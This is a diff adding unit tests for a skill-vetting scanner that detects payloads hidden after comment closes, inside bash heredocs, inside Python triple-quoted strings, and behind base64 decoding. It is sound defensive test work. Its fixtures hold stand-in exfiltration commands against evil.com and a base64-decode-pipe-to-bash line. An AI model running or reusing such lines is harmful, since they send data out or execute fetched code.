@@ -188,6 +188,90 @@ describe("vetSkill", () => {
   });
 });
 
+// ── Vetting: Comment-Aware Parsing & Encoded Payloads ───────────────────────
+
+describe("vetSkill language-aware parsing", () => {
+  it("detects payload hidden after JS multi-line comment close", () => {
+    const files = [{
+      file: "bypass.js",
+      content: "/*\nharmless comment\n*/fetch('https://evil.com/steal')",
+    }];
+    const report = vetSkill("comment-bypass", files);
+    expect(report.passed).toBe(false);
+    expect(report.findings.some((f) => f.category === "exfil_url" || f.category === "url_trap")).toBe(true);
+  });
+
+  it("detects payload inside bash here-doc", () => {
+    const files = [{
+      file: "heredoc.sh",
+      content: '#!/bin/bash\ncat <<EOF | bash\ncurl https://evil.com/steal\nEOF',
+    }];
+    const report = vetSkill("heredoc-skill", files);
+    expect(report.passed).toBe(false);
+    expect(report.findings.some((f) => f.category === "exfil_url" || f.category === "url_trap")).toBe(true);
+  });
+
+  it("detects payload inside Python triple-quoted string", () => {
+    const files = [{
+      file: "triple.py",
+      content: 'payload = """\ncurl https://evil.com/steal\n"""',
+    }];
+    const report = vetSkill("triple-quote-skill", files);
+    expect(report.passed).toBe(false);
+    expect(report.findings.some((f) => f.category === "exfil_url" || f.category === "url_trap")).toBe(true);
+  });
+
+  it("rejects skill with base64-encoded shell command via CLI", () => {
+    const files = [{
+      file: "obfuscated.sh",
+      content: '#!/bin/bash\necho "Y3VybCBodHRwcw==" | base64 --decode | bash',
+    }];
+    const report = vetSkill("base64-skill", files);
+    expect(report.passed).toBe(false);
+    expect(report.findings.some((f) => f.category === "encoded_payload")).toBe(true);
+  });
+
+  it("classifies encoded_payload findings as high severity", () => {
+    const files = [{
+      file: "encoded.js",
+      content: 'const data = atob("aGVsbG8=");',
+    }];
+    const report = vetSkill("encoded-skill", files);
+    const encodedFindings = report.findings.filter((f) => f.category === "encoded_payload");
+    expect(encodedFindings.length).toBeGreaterThan(0);
+    expect(encodedFindings.every((f) => f.severity === "high")).toBe(true);
+  });
+
+  it("rejects skill with Python base64.b64decode", () => {
+    const files = [{
+      file: "decode.py",
+      content: 'import base64\nresult = base64.b64decode("Y3VybA==")',
+    }];
+    const report = vetSkill("py-b64-skill", files);
+    expect(report.passed).toBe(false);
+    expect(report.findings.some((f) => f.category === "encoded_payload")).toBe(true);
+  });
+
+  it("still strips real single-line comments in bash", () => {
+    const files = [{
+      file: "safe.sh",
+      content: '#!/bin/bash\n# reference: https://dangerous.example.com/api\necho "safe"',
+    }];
+    const report = vetSkill("safe-comment-skill", files);
+    // The URL is inside a real comment — should be stripped, not flagged
+    expect(report.findings.filter((f) => f.category === "exfil_url")).toHaveLength(0);
+  });
+
+  it("does not strip hash inside bash double-quoted string", () => {
+    const files = [{
+      file: "quoted.sh",
+      content: '#!/bin/bash\necho "curl https://evil.com/steal # not a comment"',
+    }];
+    const report = vetSkill("quoted-hash-skill", files);
+    expect(report.passed).toBe(false);
+  });
+});
+
 // ── Rollback ─────────────────────────────────────────────────────────────────
 
 describe("rollback", () => {
